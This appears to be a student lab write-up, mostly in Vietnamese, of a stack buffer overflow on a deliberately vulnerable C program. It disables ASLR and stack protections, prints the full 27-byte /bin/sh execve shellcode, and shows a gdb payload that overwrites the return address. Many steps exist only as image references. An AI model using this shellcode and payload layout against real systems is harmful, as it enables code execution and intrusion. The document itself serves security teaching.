# 1. Injection code to delete file via vuln.c

![alt text](../images/image-32.png)

Mục tiêu là thay đổi giá trị trở về của hàm main sao cho có thể chạy shellcode

### Shellcode

#### 1. Viết chương trình shellcode bằng hợp ngữ, biên dịch (nasm) và liên kết (ld) để tạo chương trình thực thi

`nasm -g -f elf sh.asm `

`ld -m elf_i386 -o sh sh.o`

#### 2. dùng objdump -d sh để xem mã nhị phân của file sh

![alt text](../images/image-33.png)

Dùng câu lệnh này để chỉ lấy các mã nhị phân của file sh và in ra

![alt text](../images/image-34.png)

=> 27 bytes của shellcode

### Chuẩn bị môi trường lab

- Tắt chế độ cấp phát địa chỉ stack ngẫu nhiên khi load chương trình của HĐH

- ![alt text](../images/image-35.png)

- Biên dịch chương trình c với các option tắt cơ chế bảo vệ stack và cho phép thực thi code trên stack

![alt text](../images/image-36.png)

* "-z execstack: "cho phép thực thi code trên stack"

- Creat link to zsh instead of default dash to turn off bash countermeasures of Ubuntu 16.04
  
![alt text](../images/image-37.png)

* Phiên bản 16.04 có cơ chế bảo vệ stack => tắt đi => tạo shell mới zsh cho phép thực thi

### CONDUCTING THE ATTACK

Mục tiêu là chèn 27 bytes của shellcode vào biến buf + 41 bytes bất kì

=> 68 bytes của buf + ebp

disas main

![alt text](../images/image-40.png)

đặt breakpoint sau khi stackframe được thiết lập: 0x08048441

![alt text](../images/image-38.png)

đặt breakpoint sau khi esp quay trở lại trí ban đầu: 0x0804846b

![alt text](../images/image-39.png)

chạy chương trình

`r $(python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80'+'41'*a+'\xff\xff\xff\xff')")`

*'\xff\xff\xff\xff': dùng để nhận diện địa chỉ trả về của hàm main

xem bộ nhớ stack khi stackframe được thành lập

![alt text](../images/image-42.png)

xem bộ nhớ stack sau khi đã chèn shellcode vào

![alt text](../images/image-43.png)

* 27 bytes đầu là của shellcode

* 41 bytes a

* 4 bytes 0xff là return address

thay thế địa chỉ trả về của stack thành esp

![alt text](../images/image-45.png)

bộ nhớ stack sau khi thay thế địa chỉ trả về của stack thành esp

![alt text](../images/image-46.png)

chạy tiếp

![alt text](../images/image-47.png)
